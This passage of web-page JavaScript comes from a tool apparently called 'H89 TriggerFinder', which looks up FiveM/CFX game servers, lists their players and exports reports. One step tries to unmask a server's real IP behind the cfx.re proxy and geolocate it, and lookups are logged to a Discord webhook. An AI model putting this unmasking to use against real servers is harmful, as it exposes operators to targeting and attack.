 '<span class="h89-cfx-badge">ID '+escapeHtml(String(p.id ?? ""))+'</span>'+ 
 '</div>'+
 '</div>'+
 '<div class="h89-cfx-player-right">'+
 '<span class="h89-cfx-badge">'+escapeHtml(String(p.ping ?? ""))+'ms</span>'+
 '</div>'+

 '</div>'
 )).join("");
 }

 async function fetchLocation(ip){
 try{
 const r = await fetch("https://ipapi.co/"+encodeURIComponent(ip)+"/json/");
 const d = await r.json();
 if(d && !d.error){
 setText("h89-cfx-country-modal", d.country_name || "N/A");
 setText("h89-cfx-city-modal", d.city || "N/A");
 setText("h89-cfx-isp-modal", d.org || "N/A");
 setText("h89-cfx-region-modal", d.region || "N/A");
 }
 }catch(_){}
 }

 function showError(msg){
 setText("h89-cfx-error", msg);
 show("h89-cfx-error");
 }

 async function lookup(){
 const input = $("h89-cfx-id-modal")?.value || "";
 const code = extractServerCode(input);
 hide("h89-cfx-error");
 hide("h89-cfx-card-modal");
 if(!code){
 showError('Invalid input. Use "g6qlkx" or "https://cfx.re/join/xxxxxx" or cfx-finder link.');
 return;
 }
 if(isLookingUp) return;
 isLookingUp=true;
 show("h89-cfx-loader");

 try{
 const api = "https://servers-frontend.fivem.net/api/servers/single/"+encodeURIComponent(code);
 const res = await fetch(api);
 const json = await res.json();
 const data = json && json.Data;
 if(!data) throw new Error("Server not found / offline.");

 const hostname = cleanName(data.hostname || data.projectName || "Unknown");
 const bannerUrl = pickBanner(data);
 setBanner(bannerUrl);

 const owner = data.ownerName || "unknown";
 const clients = (data.clients ?? 0);
 const max = (data.sv_maxclients ?? data.vars?.sv_maxclients ?? "‚Äî");

 let endpoint = (data.connectEndPoints && data.connectEndPoints[0]) ? data.connectEndPoints[0] : "Hidden";
 // try resolve endpoints for users.cfx.re
 if(endpoint !== "Hidden" && String(endpoint).includes(".users.cfx.re")){
 try{
 const epRes = await fetch("https://"+owner+"-"+code+".users.cfx.re/client", {
 method:"POST",
 body:"method=getEndpoints",
 headers:{ "Content-Type":"text/plain" }
 });
 const eps = await epRes.json();
 if(Array.isArray(eps) && eps[0]) endpoint = eps[0];
 }catch(_){}
 }

 setText("h89-cfx-name-modal", hostname);
 setText("h89-cfx-meta-modal", "Owner: "+owner+" ‚Ä¢ Server ID: "+code);
 setText("h89-cfx-endpoint-modal", endpoint);
 setText("h89-cfx-players-modal", clients + "/" + max);

 const onesync = data.vars?.onesync_enabled === "true" ? "Enabled" : "Disabled";
 setText("h89-cfx-onesync-modal", onesync);
 setText("h89-cfx-gamebuild-modal", data.vars?.sv_enforceGameBuild || "N/A");

 // reset location
 setText("h89-cfx-country-modal", "‚Äî"); setText("h89-cfx-city-modal", "‚Äî");
 setText("h89-cfx-isp-modal", "‚Äî"); setText("h89-cfx-region-modal", "‚Äî");
 if(endpoint && endpoint !== "Hidden" && String(endpoint).includes(":")){
 const ip = String(endpoint).split(":")[0];
 fetchLocation(ip);
 }

 playersCache = Array.isArray(data.players) ? data.players : [];
 $("h89-cfx-player-search") && ($("h89-cfx-player-search").value="");
 $("h89-cfx-player-sort") && ($("h89-cfx-player-sort").value="name");
 renderPlayers();

 currentCfx = { code, name: hostname, join: "https://cfx.re/join/"+code, endpoint, banner: bannerUrl, players: clients, maxPlayers: max };
 renderFavBtn();


 // wire open/copy
 $("h89-cfx-open-modal") && ($("h89-cfx-open-modal").onclick = ()=>{
 window.open("https://www.cfx-finder.com/en/server/"+encodeURIComponent(code), "_blank");
 });
 $("h89-cfx-copy-modal") && ($("h89-cfx-copy-modal").onclick = async ()=>{
 const txt = endpoint || "";
 try{ await navigator.clipboard.writeText(txt); }
 catch(_){}
 });

 show("h89-cfx-card-modal");
 // Discord log (optional)
 try{
 if(DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith("https://")){
 const payload = {
 username: "H89 TriggerFinder",
 embeds: [{
 title: "CFX Lookup",
 color: 15158332,
 fields: [
 { name: "Server", value: name ? String(name).slice(0,256) : code, inline: false },
 { name: "Join", value: "https://cfx.re/join/"+code, inline: false },
 { name: "Endpoint", value: endpoint ? String(endpoint).slice(0,256) : "N/A", inline: true },
 { name: "Players", value: `${players}/${maxPlayers}`, inline: true }
 ],
 footer: { text: "H89 TriggerFinder ‚Ä¢ " + new Date().toLocaleString() }
 }]
 };
 fetch(DISCORD_WEBHOOK_URL, { method:"POST", headers:{ "Content-Type":"application/json" }, body: JSON.stringify(payload) }).catch(()=>{});
 }
 }catch(_){}

 }catch(err){
 showError(String(err && err.message ? err.message : err));
 }finally{
 hide("h89-cfx-loader");
 isLookingUp=false;
 }
 }

 // events
 $("h89-cfx-fetch-modal") && $("h89-cfx-fetch-modal").addEventListener("click", lookup);
 $("h89-cfx-id-modal") && $("h89-cfx-id-modal").addEventListener("keydown",(e)=>{ if(e.key==="Enter") lookup(); });
 // favorites + embed actions
 renderFavs();
 renderFavBtn();
 favBtn && (favBtn.onclick = ()=>{
 const code = currentCfx?.code || extractServerCode($("h89-cfx-id-modal")?.value || "");
 if(!code) return;
 const name = currentCfx?.name || code;
 toggleFav({ code, name, join: "https://cfx.re/join/"+code, endpoint: currentCfx?.endpoint || "", banner: currentCfx?.banner || "" });
 });
 embedBtn && (embedBtn.onclick = ()=>{
 const code = currentCfx?.code || extractServerCode($("h89-cfx-id-modal")?.value || "");
 openEmbed(code);
 });
 embedClose && (embedClose.onclick = closeEmbed);

 $("h89-cfx-player-search") && $("h89-cfx-player-search").addEventListener("input", renderPlayers);
 $("h89-cfx-player-sort") && $("h89-cfx-player-sort").addEventListener("change", renderPlayers);

 // pdf
 $("h89-cfx-pdf-modal") && $("h89-cfx-pdf-modal").addEventListener("click", ()=>{
 try{
 const jsPDF = window.jspdf && window.jspdf.jsPDF ? window.jspdf.jsPDF : null;
 if(!jsPDF){ showError("jsPDF not loaded. Check internet/CDN."); return; }
 const name = $("h89-cfx-name-modal")?.textContent?.trim();
 const endpoint = $("h89-cfx-endpoint-modal")?.textContent?.trim();
 if(!name || !endpoint || name==="‚Äî"){ showError("No server data to export."); return; }

 const doc = new jsPDF({orientation:"p", unit:"pt", format:"letter"});
 const W = doc.internal.pageSize.getWidth();
 const margin = 40;

 doc.setFontSize(16); doc.setFont(undefined,"bold");
 const title="Server Information";
 const tw = doc.getTextDimensions(title).w;
 doc.text(title, (W-tw)/2, 50);

 doc.setFontSize(10); doc.setFont(undefined,"normal");
 doc.text("Generated on: "+(new Date().toLocaleString()), margin, 70);

 doc.setFontSize(12); doc.setFont(undefined,"bold");
 let y=95;
 const lines = [
 "Name: "+name,
 "Endpoint: "+endpoint,
 "Players: "+($("h89-cfx-players-modal")?.textContent||""),
 "OneSync: "+($("h89-cfx-onesync-modal")?.textContent||""),
 "GameBuild: "+($("h89-cfx-gamebuild-modal")?.textContent||"")
 ];
 lines.forEach(l=>{ doc.text(l, margin, y); y+=16; });

 y+=10;
 doc.setFontSize(12); doc.setFont(undefined,"bold");
 doc.text("Location", margin, y); y+=16;
 doc.setFont(undefined,"normal");
 doc.text("Country: "+($("h89-cfx-country-modal")?.textContent||""), margin, y); y+=14;
 doc.text("City: "+($("h89-cfx-city-modal")?.textContent||""), margin, y); y+=14;
 doc.text("ISP: "+($("h89-cfx-isp-modal")?.textContent||""), margin, y); y+=14;
 doc.text("Region: "+($("h89-cfx-region-modal")?.textContent||""), margin, y); y+=18;

 doc.setFont(undefined,"bold");
 doc.text("Players", margin, y); y+=16;
 doc.setFont(undefined,"bold");
 doc.text("ID", margin, y); doc.text("Name", margin+60, y); doc.text("Ping", margin+360, y);
 y+=14;
 doc.setFont(undefined,"normal");
 const ps = playersCache || [];
 if(ps.length===0){
 doc.text("No players available.", margin, y);
 }else{
 ps.forEach(p=>{
 if(y>720){ doc.addPage(); y=50; }
 doc.text(String(p.id??""), margin, y);
 doc.text(String(p.name??""), margin+60, y);
 doc.text(String(p.ping??"")+"ms", margin+360, y);
 y+=16;
 });
 }

 doc.save("server_"+name.replace(/\s+/g,"_")+".pdf");
 }catch(e){
 showError("PDF error: "+(e && e.message ? e.message : e));
 }
 });

})();
</script>

<script>
(function(){
 const list = document.getElementById("h89-main-servers");
 if(!list) return;

 function renderMainServers(){
 const servers = window.H89_CFX_SERVERS || [];
 list.innerHTML = "";
 servers.forEach(s=>{
 const b = document.createElement("button");
 b.type = "button";
 b.className = "h89-quick-item";
 b.textContent = s.name || s.join || "Server";
 b.dataset.join = s.join || "";
 b.addEventListener("click", async ()=>{
 try{
 if(window.H89_CFX && typeof window.H89_CFX.lookup === "function"){
 await window.H89_CFX.lookup(s.join || "");
 }else{
 alert("CFX panel not ready yet. Please open CFX once.");
 }
 }catch(e){
 console.error(e);
 }
 });
 list.appendChild(b);
 });
 }

 window.H89_renderMainServers = renderMainServers;

 // Render when DOM ready (and also after a short delay to ensure modal script ran)
 document.addEventListener("DOMContentLoaded", ()=>{
 setTimeout(renderMainServers, 50);
 });
 setTimeout(renderMainServers, 250);
})();
</script>

<script>
/* ===== CFX Quick Servers Renderer (modal + sidebar) ===== */
(function(){
 function h89RenderQuickServers(){
 const list = document.getElementById("h89-quick-servers");
 if(!list) return;
 const servers = window.H89_CFX_SERVERS || [];
 list.innerHTML = "";
 servers.forEach((s)=>{
 const b = document.createElement("button");
 b.type = "button";
 b.className = "h89-quick-item";
 b.textContent = s.name || s.join || "Server";
 b.addEventListener("click", async ()=>{
 try{
 // fill modal input and run lookup
 const input = document.getElementById("h89-cfx-id-modal");
 if(input) input.value = s.join || "";
 // open modal if not already open
 if(window.H89_CFX && typeof window.H89_CFX.open === "function"){
 window.H89_CFX.open();
 }
 // run lookup if available
 const runBtn = document.getElementById("h89-cfx-fetch-modal");
 if(runBtn) runBtn.click();
 }catch(e){ console.error(e); }
 });
 list.appendChild(b);
 });
 }

 // Make callable
 window.h89RenderQuickServers = h89RenderQuickServers;

 // Render on load and whenever modal is opened
 document.addEventListener("DOMContentLoaded", ()=>{
 setTimeout(h89RenderQuickServers, 50);
 });

 // Hook into modal open button if present
 const hook = ()=>{
 const openBtn = document.getElementById("h89-open-cfx");
 if(openBtn){
 openBtn.addEventListener("click", ()=> setTimeout(h89RenderQuickServers, 0), { once:false });
 }
 const closeBtn = document.getElementById("h89-cfx-x");
 if(closeBtn){
 closeBtn && closeBtn.addEventListener("click", ()=>{}, { once:false });
 }
 };
 document.addEventListener("DOMContentLoaded", ()=>{
 hook();
 h89RenderQuickServers();
 // also re-render whenever the modal is opened
 const openBtn = document.getElementById("h89-open-cfx");
 if(openBtn){
 openBtn.addEventListener("click", ()=> setTimeout(h89RenderQuickServers, 0));
 }
});
})();
</script>
<!-- Settings -->

 <!-- Download (above Settings) -->
 <button id="downloadFab" title="Download" aria-label="Download">
 <span class="fab-ico">‚¨á</span>
 <span class="fab-spin" aria-hidden="true"></span>
 </button>

 <div id="downloadOverlay" aria-hidden="true">
 <div class="dl-box">
 <span class="fab-spin" style="display:block"></span>
 <div>Preparing download‚Ä¶</div>
 </div>
 </div>
<button id="settingsFab" class="h89-fab" type="button" title="Settings" aria-label="Settings">
 ‚öôÔ∏è
</button>

<div id="settingsPanel" class="h89-settings hidden" role="dialog" aria-modal="true" aria-label="Settings panel">
 <div class="h89-settings__head">
 <div class="h89-settings__title">Settings</div>
 <button id="settingsClose" class="h89-settings__close" type="button" aria-label="Close settings">‚úï</button>
 </div>

 <div class="h89-settings__body">
 <div class="h89-setting">
 <div class="h89-setting__label">Theme</div>
 <div class="h89-setting__control">
 <button class="h89-chip" id="themeDark" type="button">Dark</button>
 <button class="h89-chip" id="themeNeo" type="button">Neo</button>
 </div>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Snow Particles</div>
 <label class="h89-toggle">
 <input id="toggleSnow" type="checkbox">
 <span class="h89-toggle__ui"></span>
 </label>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Background Video</div>
 <label class="h89-toggle">
 <input id="toggleVideo" type="checkbox">
 <span class="h89-toggle__ui"></span>
 </label>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Sound</div>
 <label class="h89-toggle">
 <input id="toggleSound" type="checkbox">
 <span class="h89-toggle__ui"></span>
 </label>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Compact Login</div>
 <label class="h89-toggle">
 <input id="toggleCompactLogin" type="checkbox">
 <span class="h89-toggle__ui"></span>
 </label>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Motion</div>
 <div class="h89-setting__row">
 <select id="motionPreset" class="h89-select">
 <option value="normal">Normal</option>
 <option value="fast">Fast</option>
 <option value="slow">Slow</option>
 <option value="reduced">Reduced</option>
 </select>
 </div>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Accent</div>
 <div class="h89-setting__row">
 <select id="accentPreset" class="h89-select">
 <option value="red">H89 Red</option>
 <option value="crimson">Crimson</option>
 <option value="neon">Neon</option>
 <option value="blue">Cyber Blue</option>
 </select>
 </div>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Dock Layout</div>
 <div class="h89-setting__row">
 <label class="h89-toggle h89-toggle--small" title="Wide left panel for webhooks">
 <input id="toggleWideDock" type="checkbox">
 <span class="h89-toggle__ui"></span>
 </label>
 <span class="h89-setting__hint">Wide Webhooks Panel</span>
 </div>
 </div>

 <div class="h89-setting">
 <div class="h89-setting__label">Quick Actions</div>
 <div class="h89-setting__row">
 <button id="btnResetUI" class="h89-btn h89-btn--ghost" type="button">Reset UI</button>
 </div>
 </div>

<div class="h89-setting">
 <div class="h89-setting__label">Servers Manager</div>
 <div class="h89-setting__hint" style="opacity:.8;margin-bottom:8px">Add / remove CFX servers (saved in this browser).</div>

 <div class="h89-setting__row" style="gap:8px;flex-wrap:wrap">
 <input id="srvName" class="h89-input" placeholder="Server Name" style="flex:1;min-width:160px">
 <input id="srvJoin" class="h89-input" placeholder="https://cfx.re/join/xxxxxx" style="flex:2;min-width:220px">
 <button id="srvAddBtn" class="h89-btn" type="button">Add</button>
 </div>

 <div id="srvList" style="margin-top:10px;display:flex;flex-direction:column;gap:8px;max-height:220px;overflow:auto;"></div>

 <div class="h89-setting__row" style="margin-top:10px;gap:8px">
 <button id="srvResetBtn" class="h89-btn h89-btn--ghost" type="button">Reset Servers</button>
 </div>
</div>

<div class="h89-settings__note">
 Settings are saved in your browser (localStorage).
 </div>
 </div>
</div>

<script id="h89-settings-js">
(function(){
 const $ = (s)=>document.querySelector(s);

 // -------- Friendly error messages (Firebase/Auth/Firestore) --------
 function friendlyAuthError(err){
 const code = (err && (err.code || err.message || "")).toString();
 const map = {
 "auth/invalid-credential": "Invalid email or password.",
 "auth/wrong-password": "Invalid email or password.",
 "auth/user-not-found": "No account found for this email.",
 "auth/email-already-in-use": "This email is already in use. Use LOGIN instead.",
 "auth/weak-password": "Password is too weak (use 6+ characters).",
 "auth/too-many-requests": "Too many attempts. Please wait a minute and try again.",
 "permission-denied": "Missing permissions (Firestore rules).",
 "Missing or insufficient permissions": "Missing permissions (Firestore rules).",
 "offline": "You appear to be offline. Check your connection."
 };
 for(const k in map){
 if(code.includes(k)) return map[k];
 }
 // fallback
 if(code.includes("FirebaseError:")) return code.replace("FirebaseError:", "").trim();
 return "Something went wrong. Please try again.";
 }

 // Try to hook existing showError / setAuthMsg functions without breaking old code
 const hookNames = ["showError","setAuthMsg","authMsg","setMsg","toast","Notify","notify"];
 let hooked = false;

 function patchGlobalMessage(){
 if(hooked) return;
 // Common pattern: window.setAuthMsg(text, type)
 if(typeof window.setAuthMsg === "function"){
 const old = window.setAuthMsg;
 window.setAuthMsg = function(text, type){
 return old.call(this, (typeof text === "string" ? text : friendlyAuthError(text)), type);
 };
 hooked = true;
 return;
 }
 if(typeof window.showError === "function"){
 const old = window.showError;
 window.showError = function(text){
 return old.call(this, (typeof text === "string" ? text : friendlyAuthError(text)));
 };
 hooked = true;
 return;
 }
 }
 patchGlobalMessage();

 // Make a helper for our own UI actions
 window.H89FriendlyError = friendlyAuthError;

 // -------- Settings panel (localStorage) --------
 const LS = {
 theme: "h89_theme",
 snow: "h89_snow",
 video: "h89_video",
 sound: "h89_sound",
 compact: "h89_compact_login"
 };

 const settingsFab = $("#settingsFab");
 const settingsPanel = $("#settingsPanel");
 const settingsClose = $("#settingsClose");
 const toggleSnow = $("#toggleSnow");
 const toggleVideo = $("#toggleVideo");
 const toggleSound = $("#toggleSound");
 const toggleCompactLogin = $("#toggleCompactLogin");
 const themeDark = $("#themeDark");
 const themeNeo = $("#themeNeo");

 function setHidden(el, hidden){ el && el.classList.toggle("hidden", !!hidden); }

 function applyTheme(theme){
 // theme just flips a class; keeps your red/black style intact.
 document.body.classList.toggle("h89-neo", theme === "neo");
 themeDark && themeDark.classList.toggle("active", theme !== "neo");
 themeNeo && themeNeo.classList.toggle("active", theme === "neo");
 localStorage.setItem(LS.theme, theme);
 }

 function applySnow(on){
 // your snow particles are usually created by elements with class 'snow' or canvas.
 document.body.classList.toggle("h89-no-snow", !on);
 // hide common snow elements if present
 document.querySelectorAll(".snow, .snowflake, #snow, canvas.snow").forEach(n=>{
 n.style.display = on ? "" : "none";
 });
 localStorage.setItem(LS.snow, on ? "1" : "0");
 }

 function applyVideo(on){
 document.body.classList.toggle("h89-no-video", !on);
 const vids = document.querySelectorAll("video, #bgVideo, .bg-video video");
 vids.forEach(v=>{
 if(!on){
 v.pause?.();
 v.style.display = "none";
 } else {
 v.style.display = "";
 v.play?.().catch(()=>{});
 }
 });
 localStorage.setItem(LS.video, on ? "1" : "0");
 }

 function applySound(on){
 const auds = document.querySelectorAll("audio, #bgAudio");
 auds.forEach(a=>{
 a.muted = !on;
 if(on) a.play?.().catch(()=>{});
 });
 localStorage.setItem(LS.sound, on ? "1" : "0");
 }

 function applyCompact(on){
 document.body.classList.toggle("h89-compact-login", !!on);
 localStorage.setItem(LS.compact, on ? "1" : "0");
 }

 function loadSettings(){
 const theme = localStorage.getItem(LS.theme) || "dark";
 const snow = (localStorage.getItem(LS.snow) ?? "1") === "1";
 const video = (localStorage.getItem(LS.video) ?? "1") === "1";
 const sound = (localStorage.getItem(LS.sound) ?? "1") === "1";
 const compact = (localStorage.getItem(LS.compact) ?? "0") === "1";

 toggleSnow && (toggleSnow.checked = snow);
 toggleVideo && (toggleVideo.checked = video);
 toggleSound && (toggleSound.checked = sound);
 toggleCompactLogin && (toggleCompactLogin.checked = compact);

 applyTheme(theme);
 applySnow(snow);
 applyVideo(video);
 applySound(sound);
 applyCompact(compact);
 }

 // UI events
 if(settingsFab && settingsPanel){
 settingsFab.addEventListener("click", ()=> setHidden(settingsPanel, false));
 settingsClose && settingsClose.addEventListener("click", ()=> setHidden(settingsPanel, true));
 document.addEventListener("keydown", (e)=>{
 if(e.key === "Escape") setHidden(settingsPanel, true);
 });
 }
 toggleSnow && toggleSnow.addEventListener("change", ()=> applySnow(toggleSnow.checked));
 toggleVideo && toggleVideo.addEventListener("change", ()=> applyVideo(toggleVideo.checked));
 toggleSound && toggleSound.addEventListener("change", ()=> applySound(toggleSound.checked));
 toggleCompactLogin && toggleCompactLogin.addEventListener("change", ()=> applyCompact(toggleCompactLogin.checked));
 themeDark && themeDark.addEventListener("click", ()=> applyTheme("dark"));
 themeNeo && themeNeo.addEventListener("click", ()=> applyTheme("neo"));

 loadSettings();

 // -------- Admin / License UX improvements --------
 // 1) Ensure Create tab shows Username + License, Login tab shows only Email+Password
 function byId(id){ return document.getElementById(id); }

 const createTabBtn = document.querySelector('[data-tab="create"], #tabCreate, #createTabBtn, .tab-create, button#createBtnTab');
 const loginTabBtn = document.querySelector('[data-tab="login"], #tabLogin, #loginTabBtn, .tab-login, button#loginBtnTab');

 const usernameRow = document.querySelector('[data-field="username"], #usernameRow, .row-username, .field-username');
 const licenseRow = document.querySelector('[data-field="license"], #licenseRow, .row-license, .field-license');
 const createMainBtn = document.querySelector('#createAccountBtn, #btnCreate, .btn-create-account, [data-action="create"]');

 function showCreateMode(on){
 // best-effort: hide/show if elements exist
 if(usernameRow) usernameRow.style.display = on ? "" : "none";
 if(licenseRow) licenseRow.style.display = on ? "" : "none";
 if(createMainBtn) createMainBtn.disabled = false;
 }

 // If your UI uses active classes, keep them
 function setTab(tab){
 const isCreate = tab === "create";
 showCreateMode(isCreate);
 }

 // attempt to detect existing tab handlers; also bind ours as fallback
 if(createTabBtn) createTabBtn.addEventListener("click", ()=> setTab("create"));
 if(loginTabBtn) loginTabBtn.addEventListener("click", ()=> setTab("login"));

 // 2) Force license required on create (if your create handler exists, we wrap it)
 if(typeof window.handleCreate === "function"){
 const oldCreate = window.handleCreate;
 window.handleCreate = async function(...args){
 try{
 const lic = (document.querySelector("#licenseKey, #license, input[name='license'], input[data-license]")||{}).value || "";
 if(!lic.trim()){
 throw { code:"license/missing", message:"You cannot create an account without a valid license key." };
 }
 return await oldCreate.apply(this, args);
 }catch(e){
 // use existing message ui
 const msg = friendlyAuthError(e.code ? e : { message: e?.message || String(e) });
 if(typeof window.setAuthMsg === "function") window.setAuthMsg(msg, "error");
 else alert(msg);
 throw e;
 }
 };
 }

})();

// ===== Download FAB wiring (uses existing download button logic) =====
(function(){
 const fab = document.getElementById('downloadFab');
 const overlay = document.getElementById('downloadOverlay');
 const downloadBtn = document.getElementById('download-btn') || document.getElementById('downloadBtn');

 function setLoading(on){
 if(!fab) return;
 fab.classList.toggle('loading', !!on);
 if(overlay) overlay.classList.toggle('show', !!on);
 }

 if(fab){
 fab.addEventListener('click', async () => {
 try{
 setLoading(true);
 // Let UI paint first
 await new Promise(r => setTimeout(r, 50));

 if(downloadBtn){
 downloadBtn.click();
 }else{
 // Fallback: download current logs text
 const logsEl = document.getElementById('logs');
 const text = (logsEl && (logsEl.value || logsEl.innerText)) ? (logsEl.value || logsEl.innerText) : 'H89 TriggerFinder ‚Äì No logs to export.';
 const blob = new Blob([text], {type:'text/plain;charset=utf-8'});
 const a = document.createElement('a');
 a.href = URL.createObjectURL(blob);
 a.download = 'H89_TriggerFinder_Logs.txt';
 document.body.appendChild(a);
 a.click();
 a.remove();
 setTimeout(()=>URL.revokeObjectURL(a.href), 2000);
 }
 }catch(e){
 console.error(e);
 alert('Download failed. Check console.');
 }finally{
 // small delay so user sees loader
 setTimeout(()=>setLoading(false), 600);
 }
 });
 }
})();

</script>

<script>
(() => {
 const LS_KEY = 'h89_ui_settings_v2';

 const defaults = {
 motionPreset: 'normal', // normal|fast|slow|reduced
 accentPreset: 'red', // red|crimson|neon|blue
 wideDock: true
 };

 const ACCENTS = {
 red: { a:'#ff1a1a', b:'#b30000' },
 crimson: { a:'#ff2d55', b:'#b3122e' },
 neon: { a:'#00ff9a', b:'#00b86f' },
 blue: { a:'#2aa8ff', b:'#1466ff' }
 };

 function loadSettings(){
 try{
 const raw = localStorage.getItem(LS_KEY);
 if(!raw) return { ...defaults };
 const obj = JSON.parse(raw);
 return { ...defaults, ...obj };
 }catch(e){
 return { ...defaults };
 }
 }

 function saveSettings(s){
 localStorage.setItem(LS_KEY, JSON.stringify(s));
 }

 function applySettings(s){
 // motion
 document.body.classList.toggle('h89-reduce-motion', s.motionPreset === 'reduced');
 const motion = (s.motionPreset === 'fast') ? 0.75 :
 (s.motionPreset === 'slow') ? 1.35 :
 (s.motionPreset === 'reduced') ? 0.01 : 1;
 document.documentElement.style.setProperty('--h89-motion', String(motion));

 // accent
 const c = ACCENTS[s.accentPreset] || ACCENTS.red;
 document.documentElement.style.setProperty('--h89-accent', c.a);
 document.documentElement.style.setProperty('--h89-accent2', c.b);

 // wide dock
 document.body.classList.toggle('h89-wide-dock', !!s.wideDock);
 }

 // Motion number animation for stats
 function animateStats(){
 const els = document.querySelectorAll('.stat-number');
 els.forEach(el => {
 const target = Number(String(el.textContent).replace(/[^\d.]/g,'') || '0');
 const isInt = Number.isInteger(target);
 const start = 0;
 const duration = 650;
 const t0 = performance.now();
 function tick(now){
 const p = Math.min(1, (now - t0) / duration);
 const eased = 1 - Math.pow(1 - p, 3);
 const v = start + (target - start) * eased;
 el.textContent = isInt ? String(Math.round(v)) : String(v.toFixed(1));
 if(p < 1) requestAnimationFrame(tick);
 }
 requestAnimationFrame(tick);
 });
 }

 // Smart UX shortcuts
 function bindShortcuts(){
 document.addEventListener('keydown', (e) => {
 const tag = (e.target && e.target.tagName) ? e.target.tagName.toLowerCase() : '';
 const typing = tag === 'input' || tag === 'textarea' || e.target?.isContentEditable;

 // "/" focus main search
 if(!typing && e.key === '/'){
 e.preventDefault();
 const mainSearch = document.querySelector('input[type="text"][placeholder*="Search"], #searchInput, #queryInput');
 mainSearch?.focus();
 mainSearch?.select?.();
 }

 // Esc closes panels/modals
 if(e.key === 'Escape'){
 document.querySelector('#cfxModal?.h89-modal--open');
 }

 // s opens settings, g opens CFX
 if(!typing && (e.key === 's' || e.key === 'S')){
 const btn = document.getElementById('btnSettings') || document.querySelector('[data-open-settings]');
 btn?.click();
 }
 if(!typing && (e.key === 'g' || e.key === 'G')){
 const btn = document.getElementById('btnCFX') || document.querySelector('[data-open-cfx]');
 btn?.click();
 }
 });
 }

 function hookCFXSearch(){
 const input = document.getElementById('cfxInput') || document.querySelector('#cfxModal input[type="text"]');
 const btnLookup = document.getElementById('cfxLookupBtn') || document.querySelector('#cfxModal button[id*="Lookup"], #cfxModal .btn-lookup');
 if(input && btnLookup){
 // restore
 const last = localStorage.getItem('h89_last_cfx') || '';
 if(last && !input.value) input.value = last;

 const run = () => {
 const v = (input.value || '').trim();
 if(v) localStorage.setItem('h89_last_cfx', v);
 btnLookup.click();
 };
 input.addEventListener('keydown', (e) => {
 if(e.key === 'Enter'){
 e.preventDefault();
 run();
 }
 });
 }
 }

 function wireSettingsUI(){
 const motionSel = document.getElementById('motionPreset');
 const accentSel = document.getElementById('accentPreset');
 const wideDock = document.getElementById('toggleWideDock');
 const btnReset = document.getElementById('btnResetUI');

 let s = loadSettings();
 applySettings(s);

 if(motionSel) motionSel.value = s.motionPreset;
 if(accentSel) accentSel.value = s.accentPreset;
 if(wideDock) wideDock.checked = !!s.wideDock;

 const update = () => {
 s = loadSettings();
 if(motionSel) s.motionPreset = motionSel.value;
 if(accentSel) s.accentPreset = accentSel.value;
 if(wideDock) s.wideDock = wideDock.checked;
 saveSettings(s);
 applySettings(s);
 };

 motionSel?.addEventListener('change', update);
 accentSel?.addEventListener('change', update);
 wideDock?.addEventListener('change', update);

 btnReset?.addEventListener('click', () => {
 localStorage.removeItem(LS_KEY);
 localStorage.removeItem('h89_last_cfx');
 const s0 = { ...defaults };
 saveSettings(s0);
 applySettings(s0);
 if(motionSel) motionSel.value = s0.motionPreset;
 if(accentSel) accentSel.value = s0.accentPreset;
 if(wideDock) wideDock.checked = !!s0.wideDock;
 });
 }

 window.addEventListener('DOMContentLoaded', () => {
 try{
 wireSettingsUI();
 animateStats();
 bindShortcuts();
 hookCFXSearch();
 }catch(e){
 console.warn('H89 UX layer error', e);
 }
 });
})();
</script>

<script>
(function(){
 /* ===== (1) Dock resize (Webhooks panel) ===== */
 const handle = document.getElementById("dockResizeHandle");
 const root = document.documentElement;

 function clamp(n, a, b){ return Math.max(a, Math.min(b, n)); }
 function setDockW(px){
 const v = clamp(px, 320, 720);
 root.style.setProperty("--dockW", v + "px");
 localStorage.setItem("h89_dockW", String(v));
 }
 const savedW = parseInt(localStorage.getItem("h89_dockW") || "", 10);
 if(savedW) setDockW(savedW);

 let dragging = false;
 handle && handle.addEventListener("mousedown", (e)=>{
 dragging = true;
 document.body.style.userSelect = "none";
 });
 window.addEventListener("mousemove", (e)=>{
 if(!dragging) return;
 const wh = document.querySelector(".webhook-container");
 if(!wh) return;
 const left = wh.getBoundingClientRect().left;
 setDockW(e.clientX - left);
 });
 window.addEventListener("mouseup", ()=>{
 if(!dragging) return;
 dragging = false;
 document.body.style.userSelect = "";
 });

 /* ===== (2) Admin servers manager (Add/Remove) ===== */
 const KEY = "h89_servers";
 function normalizeJoin(v){
 v = (v||"").trim();
 if(!v) return "";
 if(!v.startsWith("http")) v = "https://cfx.re/join/" + v.replace(/^\/+/,"");
 return v;
 }

 function loadServers(){
 try{
 const raw = localStorage.getItem(KEY);
 if(raw){
 const parsed = JSON.parse(raw);
 if(Array.isArray(parsed) && parsed.length) return parsed;
 }
 }catch(e){}
 return window.H89_CFX_SERVERS || [];
 }

 function saveServers(list){
 localStorage.setItem(KEY, JSON.stringify(list));
 window.H89_CFX_SERVERS = list;
 if(window.H89_renderMainServers) window.H89_renderMainServers();
 // quick list inside modal re-renders when opening; but we also expose:
 if(window.H89_renderQuickServers) window.H89_renderQuickServers();
 }

 // Initialize from localStorage (keeps your default list as fallback)
 window.H89_CFX_SERVERS = loadServers();

 const srvList = document.getElementById("srvList");
 const srvName = document.getElementById("srvName");
 const srvJoin = document.getElementById("srvJoin");
 const srvAdd = document.getElementById("srvAddBtn");
 const srvReset = document.getElementById("srvResetBtn");

 function renderSrvList(){
 if(!srvList) return;
 const servers = loadServers();
 srvList.innerHTML = "";
 servers.forEach((s, idx)=>{
 const row = document.createElement("div");
 row.style.display = "flex";
 row.style.gap = "8px";
 row.style.alignItems = "center";

 const pill = document.createElement("div");
 pill.className = "h89-chip";
 pill.style.flex = "1";
 pill.style.cursor = "default";
 pill.textContent = (s.name || "Server") + " ‚Äî " + (s.join || "");

 const del = document.createElement("button");
 del.className = "h89-btn h89-btn--ghost";
 del.type = "button";
 del.textContent = "Remove";
 del.addEventListener("click", ()=>{
 const next = servers.filter((_,i)=>i!==idx);
 saveServers(next);
 renderSrvList();
 });

 row.appendChild(pill);
 row.appendChild(del);
 srvList.appendChild(row);
 });
 }

 srvAdd && srvAdd.addEventListener("click", ()=>{
 const name = (srvName && srvName.value || "").trim();
 const join = normalizeJoin(srvJoin && srvJoin.value || "");
 if(!name || !join){
